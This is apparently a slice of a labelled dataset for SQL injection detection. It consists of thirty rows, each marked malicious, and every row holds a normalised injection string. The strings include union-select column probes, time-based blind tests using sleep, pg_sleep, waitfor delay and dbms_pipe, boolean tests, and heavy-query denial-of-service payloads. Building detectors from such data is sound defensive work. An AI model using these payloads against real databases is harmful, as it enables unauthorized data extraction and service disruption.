row_index,payload_norm,label,sqli_type_hint
3240,"1"" and make_set ( 8403 = 8403,8899 )",1,
3241,"-5225' ) ) as zats where 5629 = 5629 union all select 5629,5629,5629,5629,5629--",1,
3242,"-8893%' ) union all select 1254,1254--",1,
3243,"1%"" ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
3244,"-5596' ) ) ) union all select 4877,4877,4877,4877,4877,4877,4877,4877,4877,4877--",1,
3245,"-7238%' or make_set ( 5375 = 9563,9563 ) and '%' = '",1,
3246,"-6883"" ) as tbai where 8121 = 8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--",1,
3247,"1 where 6408 = 6408 union all select null,null,null,null,null,null,null,null--",1,
3248,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) #",1,
3249,"1%' ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,
3250,"1"" ) where 4964 = 4964",1,
3251,1 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) -- yczq,1,
3252,"1%' or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and '%' = '",1,
3253,"1' ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 'cdaq' like 'cdaq",1,
3254,"1 ) union all select null,null,null,null,null#",1,
3255,1' ) ) as jzoh where 6484 = 6484 and 7364 = 4233--,1,
3256,"1 ) where 2781 = 2781 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
3257,"-9764' where 1266 = 1266 or elt ( 4069 = 6162,6162 ) --",1,
3258,1 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) -- knpw,1,
3259,1%' rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,
3260,1 where 3802 = 3802 and 2006 = 2006,1,
3261,"-4355"" ) ) ) or 9323 = 9323#",1,
3262,"1"" ) ) as ihfw where 3949 = 3949 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
3263,1 ) ) as trin where 8843 = 8843,1,
3264,1'|| ( select 'xdzp' from dual where 5786 = 5786 and ( 3020 = 3020 ) *6703 ) ||',1,
3265,-3881 ) ) ) union all select 4438--,1,
3266,select sleep ( 5 ) and ( ( ( '%' = ',1,
3267,1'+ ( select 'dkxk' where 1241 = 1241 waitfor delay '0:0:5'--,1,
3268,"1"" ) and elt ( 6651 = 1172,1172 ) and ( ""zfkb"" like ""zfkb",1,
3269,"1"" ) and 6565 = 2647 and ( ""mrge"" like ""mrge",1,
